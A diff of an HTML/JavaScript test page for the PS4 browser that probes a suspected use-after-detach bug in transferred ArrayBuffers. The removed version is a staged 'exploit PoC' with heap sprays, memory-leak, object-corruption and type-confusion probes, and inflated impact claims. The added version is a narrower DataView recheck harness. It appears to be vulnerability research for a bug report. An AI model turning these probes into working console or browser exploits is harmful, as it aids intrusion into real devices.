@@ -1,405 +1,248 @@
 
 <!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<title>PS4 UaD Exploit PoC - Advanced</title>
-<style>
-body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
-button { padding: 10px; margin: 5px; font-size: 14px; }
-.critical { color: #ff4444; font-weight: bold; }
-.warning { color: #ffaa00; }
-.success { color: #44ff44; }
-pre { background: #2d2d2d; padding: 10px; overflow-x: auto; }
-</style>
-</head>
-<body>
+<meta charset="utf-8">
+<title>PS4 T8 Recheck — DROP Confirm + Post-Detach DataView Oracle (Minimal)</title>
 
-<h2>PS4 MessageChannel UaD - Exploit PoC</h2>
+<h3>PS4 T8 Recheck — DROP Confirm + Post-Detach DataView Oracle (Minimal)</h3>
 
-<button onclick="runStage1()">Stage 1: Detect UaD Window</button>
-<button onclick="runStage2()">Stage 2: Memory Read/Write</button>
-<button onclick="runStage3()">Stage 3: Object Corruption</button>
-<button onclick="runStage4()">Stage 4: Type Confusion</button>
-<button onclick="resetLog()">Reset log</button>
+<button id="run">RUN AUTO</button>
+<button id="stop">STOP</button>
+<button id="reset">Reset log</button>
 
-<p>
-Attempts: <input id="attempts" type="number" value="100">
-Delay(ms): <input id="delay" type="number" value="30">
-Spray Size: <input id="spraySize" type="number" value="1000">
-</p>
+<div>
+  N: <input id="N" type="number" value="60" min="1" step="1">
+  fastTimeout(ms): <input id="fast" type="number" value="2" min="0" step="1">
+  lateWait(ms): <input id="late" type="number" value="1500" min="0" step="50">
+  delay(ms): <input id="delay" type="number" value="30" min="0" step="5">
+  pressure(0..3): <input id="p" type="number" value="1" min="0" max="3" step="1">
+</div>
 
 <pre id="log"></pre>
 
 <script>
-let running = false;
+(() => {
+  "use strict";
+  const $log = document.getElementById("log");
+  const $N = document.getElementById("N");
+  const $fast = document.getElementById("fast");
+  const $late = document.getElementById("late");
+  const $delay = document.getElementById("delay");
+  const $p = document.getElementById("p");
 
-function log(s, className=''){
-  const span = document.createElement('span');
-  if(className) span.className = className;
-  span.textContent = `[${Date.now()}] ${s}\n`;
-  document.getElementById("log").appendChild(span);
-}
+  let STOP = false;
 
-function resetLog(){
-  document.getElementById("log").textContent = "";
-  log("=== PS4 UaD Exploit PoC - HackerOne Report ===");
-}
+  const ts = () => Date.now();
+  const logLine = (s) => ($log.textContent += `[${ts()}] ${s}\n`);
+  const reset = () => { $log.textContent = ""; logLine("Reset."); };
+  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+  const j = (x) => { try { return JSON.stringify(x); } catch(e){ return String(x); } };
 
-function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
-
-// ============================================================
-// STAGE 1: Detectar e caracterizar a janela UaD
-// ============================================================
-async function runStage1(){
-  log("============================================================");
-  log("STAGE 1: UaD Window Detection & Characterization", "warning");
-  log("============================================================");
-  
-  const attempts = +document.getElementById("attempts").value;
-  const delayMs = +document.getElementById("delay").value;
-  
-  const stats = {
-    total: 0,
-    detached: 0,
-    uad_read_success: 0,
-    uad_write_success: 0,
-    uad_both_success: 0,
-    corruption_detected: 0
-  };
-  
-  const successfulReads = [];
-  const successfulWrites = [];
-  
-  for(let i = 0; i < attempts; i++){
-    const ch = new MessageChannel();
-    
-    // ArrayBuffer com padrão reconhecível
-    const ab = new ArrayBuffer(8192);
-    const u8 = new Uint8Array(ab);
-    const u32 = new Uint32Array(ab);
-    
-    // Padrão de teste: 0xDEADBEEF seguido de contador
-    u32[0] = 0xDEADBEEF;
-    u32[1] = i;
-    for(let j = 2; j < 100; j++) u32[j] = 0x41414141 + j;
-    
-    let received = undefined;
-    ch.port2.onmessage = e => received = e.data;
-    
-    try {
-      ch.port1.postMessage(ab, [ab]);
-    } catch(e) {
-      continue;
+  function pressure(level){
+    // 0..3: bem controlado (não DoS)
+    if (!level) return null;
+    const chunks = [0, 24, 48, 72][level];
+    const size   = [0, 0x6000, 0x8000, 0xA000][level];
+    const keep = [];
+    for (let i=0;i<chunks;i++){
+      const ab = new ArrayBuffer(size);
+      const u8 = new Uint8Array(ab);
+      u8[0] = i & 0xFF;
+      u8[u8.length-1] = (i*13) & 0xFF;
+      keep.push(u8);
     }
-    
-    await sleep(0);
-    await sleep(delayMs);
-    
-    stats.total++;
-    
-    if(ab.byteLength === 0) {
-      stats.detached++;
-      
-      // TESTE 1: Conseguimos LER após detach?
-      let readValue = null;
-      let readSuccess = false;
-      try {
-        readValue = u32[0];
-        if(readValue !== undefined) {
-          readSuccess = true;
-          stats.uad_read_success++;
-          successfulReads.push({
-            iteration: i,
-            value: readValue.toString(16),
-            expected: "0xDEADBEEF"
-          });
-        }
-      } catch(e) {}
-      
-      // TESTE 2: Conseguimos ESCREVER após detach?
-      let writeSuccess = false;
-      try {
-        const testValue = 0xCAFEBABE;
-        u32[0] = testValue;
-        const verify = u32[0];
-        if(verify === testValue) {
-          writeSuccess = true;
-          stats.uad_write_success++;
-          successfulWrites.push({
-            iteration: i,
-            written: testValue.toString(16),
-            verified: verify.toString(16)
-          });
-        }
-      } catch(e) {}
-      
-      if(readSuccess && writeSuccess) {
-        stats.uad_both_success++;
-      }
-      
-      // TESTE 3: O receptor vê a corrupção?
-      await sleep(delayMs * 2);
-      if(received !== undefined && writeSuccess) {
-        const recvU32 = new Uint32Array(received);
-        if(recvU32[0] === 0xCAFEBABE) {
-          stats.corruption_detected++;
-          log(`[!] CRITICAL: Memory corruption confirmed at iteration ${i}`, "critical");
-        }
-      }
-    }
-    
-    if((i + 1) % 20 === 0) log(`Progress: ${i + 1}/${attempts}`);
+    return keep;
   }
-  
-  log("------------------------------------------------------------");
-  log("STAGE 1 RESULTS:", "success");
-  log(JSON.stringify(stats, null, 2));
-  
-  if(stats.uad_read_success > 0) {
-    log(`[!] UaD READ confirmed: ${stats.uad_read_success}/${stats.detached} detached buffers`, "critical");
-    log("Sample reads: " + JSON.stringify(successfulReads.slice(0, 3), null, 2));
-  }
-  
-  if(stats.uad_write_success > 0) {
-    log(`[!] UaD WRITE confirmed: ${stats.uad_write_success}/${stats.detached} detached buffers`, "critical");
-    log("Sample writes: " + JSON.stringify(successfulWrites.slice(0, 3), null, 2));
-  }
-  
-  if(stats.corruption_detected > 0) {
-    log(`[!!!] MEMORY CORRUPTION: Sender changes reflected in receiver buffer`, "critical");
-    log(`This proves shared memory access after transfer - CRITICAL VULNERABILITY`, "critical");
-  }
-  
-  log("DONE.");
-}
 
-// ============================================================
-// STAGE 2: Demonstrar leitura/escrita de memória arbitrária
-// ============================================================
-async function runStage2(){
-  log("============================================================");
-  log("STAGE 2: Memory Read/Write Demonstration", "warning");
-  log("============================================================");
-  
-  const delayMs = +document.getElementById("delay").value;
-  
-  // Criar múltiplos buffers para tentar overlap de memória
-  const buffers = [];
-  const views = [];
-  const channels = [];
-  
-  log("Creating buffer spray...");
-  
-  for(let i = 0; i < 20; i++){
+  async function runOnce(i, cfg, stats, samples){
     const ch = new MessageChannel();
+
+    // Victim
     const ab = new ArrayBuffer(4096);
-    const u32 = new Uint32Array(ab);
-    
-    // Marcar cada buffer com ID único
-    u32[0] = 0xBAADF00D;
-    u32[1] = i;
-    
-    buffers.push(ab);
-    views.push(u32);
-    channels.push(ch);
-    
-    let received = undefined;
-    ch.port2.onmessage = e => received = e.data;
-    
+    const u8 = new Uint8Array(ab);
+    const dv = new DataView(ab);
+    u8[0] = 0xAA;
+
+    let got = undefined;
+    let gotAt = 0;
+
+    ch.port2.onmessage = (ev) => { got = ev.data; gotAt = ts(); };
+
+    // Transfer
     try {
       ch.port1.postMessage(ab, [ab]);
-    } catch(e) {}
-  }
-  
-  await sleep(delayMs);
-  
-  log("Probing for cross-buffer access...");
-  
-  const leaks = [];
-  
-  for(let i = 0; i < views.length; i++){
-    if(buffers[i].byteLength === 0) { // Detached
-      try {
-        // Tentar ler além do buffer original
-        const leak = [];
-        for(let offset = 0; offset < 256; offset++){
-          const val = views[i][offset];
-          if(val !== undefined && val !== 0) {
-            leak.push({offset, value: val.toString(16)});
-          }
-        }
-        
-        if(leak.length > 0) {
-          leaks.push({buffer: i, leaked: leak.slice(0, 10)});
-          log(`[!] Buffer ${i} leaked ${leak.length} non-zero values`, "warning");
-        }
-      } catch(e) {}
+    } catch(e){
+      stats.post_throw++;
+      if (samples.post_throw.length < 3) samples.post_throw.push({i, err: (e&&e.name)||"ERR"});
+      return;
     }
-  }
-  
-  if(leaks.length > 0) {
-    log(`[!!!] MEMORY LEAK detected from ${leaks.length} buffers`, "critical");
-    log("Sample leaks: " + JSON.stringify(leaks.slice(0, 2), null, 2));
-    log("Impact: Potential ASLR bypass, heap layout disclosure", "critical");
-  } else {
-    log("No memory leaks detected in this run");
-  }
-  
-  log("DONE.");
-}
 
-// ============================================================
-// STAGE 3: Corrupção de objetos JavaScript
-// ============================================================
-async function runStage3(){
-  log("============================================================");
-  log("STAGE 3: JavaScript Object Corruption", "warning");
-  log("============================================================");
-  
-  const delayMs = +document.getElementById("delay").value;
-  
-  // Criar objetos adjacentes na heap
-  const targetObjects = [];
-  const spraySize = +document.getElementById("spraySize").value;
-  
-  log(`Creating object spray (${spraySize} objects)...`);
-  
-  for(let i = 0; i < spraySize; i++){
-    targetObjects.push({
-      id: i,
-      secret: 0x1337C0DE,
-      ptr: new Uint32Array(8),
-      flag: false
-    });
-  }
-  
-  log("Creating UaD buffers near target objects...");
-  
-  const ch = new MessageChannel();
-  const ab = new ArrayBuffer(4096);
-  const u32 = new Uint32Array(ab);
-  
-  // Preencher com padrão de sobrescrita
-  for(let i = 0; i < u32.length; i++){
-    u32[i] = 0xDEADC0DE;
-  }
-  
-  let received = undefined;
-  ch.port2.onmessage = e => received = e.data;
-  
-  try {
-    ch.port1.postMessage(ab, [ab]);
-  } catch(e) {
-    log("Transfer failed");
-    return;
-  }
-  
-  await sleep(delayMs);
-  
-  if(ab.byteLength === 0) {
-    log("Buffer detached, attempting object corruption...");
-    
-    try {
-      // Tentar sobrescrever memória adjacente
-      for(let i = 0; i < u32.length; i++){
-        u32[i] = 0x41424344 + i;
+    // FAST WAIT (para reproduzir “drop_fast”)
+    if (cfg.fastTimeoutMs > 0) await sleep(cfg.fastTimeoutMs);
+
+    const senderLenFast = ab.byteLength;
+    const gotFast = !(got === undefined || got === null);
+
+    if (senderLenFast === 0 && !gotFast) {
+      stats.drop_fast++;
+    }
+
+    // LATE WAIT (confirmar se era só entrega atrasada)
+    if (cfg.lateWaitMs > 0) await sleep(cfg.lateWaitMs);
+
+    const senderLen = ab.byteLength;
+    const gotLate = !(got === undefined || got === null);
+
+    // Classificações base
+    if (senderLen === 0 && gotLate) {
+      stats.detach_ok++;
+    } else if (senderLen === 0 && !gotLate) {
+      // DROP CONFIRMADO: detached + nada chegou mesmo depois do late wait
+      stats.drop_confirmed++;
+      if (samples.drop_confirmed.length < 3) {
+        samples.drop_confirmed.push({i, senderLen, gotType: (got === null ? "null" : "undefined")});
       }
-      
-      // Verificar se algum objeto foi corrompido
-      let corrupted = 0;
-      for(let obj of targetObjects){
-        if(obj.secret !== 0x1337C0DE || obj.flag !== false){
-          corrupted++;
-          log(`[!] Object ${obj.id} corrupted! secret=${obj.secret.toString(16)}, flag=${obj.flag}`, "warning");
+
+      // sanity: canal ainda funciona? (fila pós-drop)
+      const q = [];
+      ch.port2.onmessage = (ev) => q.push(ev.data);
+      try { ch.port1.postMessage({k:1}); ch.port1.postMessage({k:2}); ch.port1.postMessage({k:3}); } catch(e){}
+
+      await sleep(50);
+
+      const ok = (q.length === 3 && q[0]?.k===1 && q[1]?.k===2 && q[2]?.k===3);
+      if (ok) stats.queue_ok++;
+      else {
+        stats.queue_bad++;
+        if (samples.queue_bad.length < 3) samples.queue_bad.push({i, gotCount:q.length, first:q[0]?.k});
+      }
+      return;
+    } else if (senderLen === 4096 && gotLate) {
+      stats.no_detach_or_clone++;
+      return;
+    } else if (senderLen !== 0 && senderLen !== 4096) {
+      stats.sender_impossible++;
+      if (samples.sender_impossible.length < 3) samples.sender_impossible.push({i, senderLen});
+      return;
+    } else {
+      stats.other++;
+      return;
+    }
+
+    // A partir daqui: detach_ok
+    // Oracle forte: DataView pós-detach deve lançar (em engines corretas).
+    let dvOK = false, dvErr = null, dvVal = null;
+    try { dvVal = dv.getUint8(0); dvOK = true; }
+    catch(e){ dvErr = (e && e.name) ? e.name : "ERR"; }
+
+    // TypedArray index normalmente vira undefined (sem throw). Isso não é “bug” sozinho.
+    let taVal = null, taThrew = false;
+    try { taVal = u8[0]; } catch(e){ taThrew = true; }
+
+    // Invariantes do view
+    const inv = {
+      abLen: ab.byteLength,
+      u8Len: u8.length,
+      u8ByteLen: u8.byteLength
+    };
+
+    // Se DataView leu após detach, isso é “hot” (bem melhor que u8[0]).
+    if (dvOK) {
+      stats.dv_read_after_detach++;
+      if (samples.dv_read_after_detach.length < 3) {
+        samples.dv_read_after_detach.push({i, dvVal, taVal, taThrew, inv});
+      }
+    } else {
+      stats.dv_throw_after_detach++;
+    }
+
+    // Pressão leve e recheck (só para “changed without write”, se existir)
+    const keep = pressure(cfg.pressure);
+    await Promise.resolve();
+
+    if (dvOK) {
+      // re-leitura: mudou sem write?
+      let dvOK2=false, dvVal2=null;
+      try { dvVal2 = dv.getUint8(0); dvOK2 = true; } catch(e){}
+      if (dvOK2 && dvVal2 !== dvVal) {
+        stats.dv_changed_no_write++;
+        if (samples.dv_changed_no_write.length < 3) {
+          samples.dv_changed_no_write.push({i, before:dvVal, after:dvVal2, inv});
         }
       }
-      
-      if(corrupted > 0){
-        log(`[!!!] CRITICAL: ${corrupted} JavaScript objects corrupted!`, "critical");
-        log("Impact: Arbitrary code execution via vtable/property corruption", "critical");
-      } else {
-        log("No object corruption detected in this run");
-      }
-      
-    } catch(e) {
-      log(`Exception during corruption: ${e.message}`);
     }
-  }
-  
-  log("DONE.");
-}
 
-// ============================================================
-// STAGE 4: Type Confusion
-// ============================================================
-async function runStage4(){
-  log("============================================================");
-  log("STAGE 4: Type Confusion Exploitation", "warning");
-  log("============================================================");
-  
-  const delayMs = +document.getElementById("delay").value;
-  
-  log("Creating type confusion setup...");
-  
-  // Criar dois buffers de tipos diferentes
-  const ch1 = new MessageChannel();
-  const ab1 = new ArrayBuffer(1024);
-  const f64 = new Float64Array(ab1);
-  const u32 = new Uint32Array(ab1);
-  
-  // Preencher com padrão float
-  for(let i = 0; i < f64.length; i++){
-    f64[i] = Math.PI * i;
+    if (keep && keep.length) keep[0][0] ^= 0;
   }
-  
-  let received1 = undefined;
-  ch1.port2.onmessage = e => received1 = e.data;
-  
-  try {
-    ch1.port1.postMessage(ab1, [ab1]);
-  } catch(e) {
-    log("Transfer failed");
-    return;
-  }
-  
-  await sleep(delayMs);
-  
-  if(ab1.byteLength === 0) {
-    log("Buffer detached, attempting type confusion...");
-    
-    try {
-      // Tentar interpretar float como integer
-      const asInt1 = u32[0];
-      const asInt2 = u32[1];
-      const asFloat = f64[0];
-      
-      log(`Type confusion test:`, "warning");
-      log(`  Float64[0] = ${asFloat}`);
-      log(`  Uint32[0] = 0x${asInt1.toString(16)}`);
-      log(`  Uint32[1] = 0x${asInt2.toString(16)}`);
-      
-      // Tentar criar um float64 com padrão controlado (potencial ponteiro falso)
-      u32[0] = 0x41414141;
-      u32[1] = 0x42424242;
-      
-      const confusedFloat = f64[0];
-      log(`  After write: Float64[0] = ${confusedFloat}`, "warning");
-      
-      if(!isNaN(confusedFloat)){
-        log(`[!] Type confusion successful - could be used for addrof/fakeobj primitives`, "critical");
-      }
-      
-    } catch(e) {
-      log(`Exception: ${e.message}`);
+
+  async function runAuto(){
+    STOP = false;
+
+    const cfg = {
+      N: Math.max(1, parseInt($N.value||"60",10)),
+      fastTimeoutMs: Math.max(0, parseInt($fast.value||"2",10)),
+      lateWaitMs: Math.max(0, parseInt($late.value||"1500",10)),
+      delayMs: Math.max(0, parseInt($delay.value||"30",10)),
+      pressure: Math.max(0, Math.min(3, parseInt($p.value||"1",10)))
+    };
+
+    logLine(`RUN AUTO :: N=${cfg.N} fast=${cfg.fastTimeoutMs}ms late=${cfg.lateWaitMs}ms delay=${cfg.delayMs}ms pressure=${cfg.pressure}`);
+
+    const stats = {
+      detach_ok: 0,
+      drop_fast: 0,
+      drop_confirmed: 0,
+      post_throw: 0,
+      sender_impossible: 0,
+      no_detach_or_clone: 0,
+      other: 0,
+
+      queue_ok: 0,
+      queue_bad: 0,
+
+      dv_throw_after_detach: 0,
+      dv_read_after_detach: 0,
+      dv_changed_no_write: 0
+    };
+
+    const samples = {
+      drop_confirmed: [],
+      queue_bad: [],
+      sender_impossible: [],
+      post_throw: [],
+      dv_read_after_detach: [],
+      dv_changed_no_write: []
+    };
+
+    for (let i=0;i<cfg.N;i++){
+      if (STOP) break;
+      await runOnce(i, cfg, stats, samples);
+      if ((i+1) % 10 === 0) logLine(`progress: ${i+1}/${cfg.N}`);
+      if (cfg.delayMs) await sleep(cfg.delayMs);
     }
-  }
-  
-  log("DONE.");
-}
 
-resetLog();
+    logLine("RESULT SUMMARY:");
+    logLine(j(stats));
+
+    const hot = [];
+    if (samples.dv_read_after_detach.length) hot.push({kind:"DV_READ_AFTER_DETACH", samples: samples.dv_read_after_detach});
+    if (samples.dv_changed_no_write.length) hot.push({kind:"DV_CHANGED_NO_WRITE", samples: samples.dv_changed_no_write});
+    if (samples.drop_confirmed.length) hot.push({kind:"DROP_CONFIRMED", samples: samples.drop_confirmed});
+    if (samples.queue_bad.length) hot.push({kind:"QUEUE_BAD_AFTER_DROP", samples: samples.queue_bad});
+    if (samples.sender_impossible.length) hot.push({kind:"SENDER_LEN_IMPOSSIBLE", samples: samples.sender_impossible});
+    if (samples.post_throw.length) hot.push({kind:"POST_THROW", samples: samples.post_throw});
+
+    if (hot.length) {
+      logLine("HOT SAMPLES:");
+      logLine(j(hot));
+    }
+
+    logLine("DONE.");
+  }
+
+  document.getElementById("run").onclick = () => runAuto().catch(e => logLine("ERR: " + ((e&&e.name)||String(e))));
+  document.getElementById("stop").onclick = () => { STOP = true; logLine("STOP requested."); };
+  document.getElementById("reset").onclick = reset;
+
+  reset();
+})();
 </script>
-
-</body>
-</html>
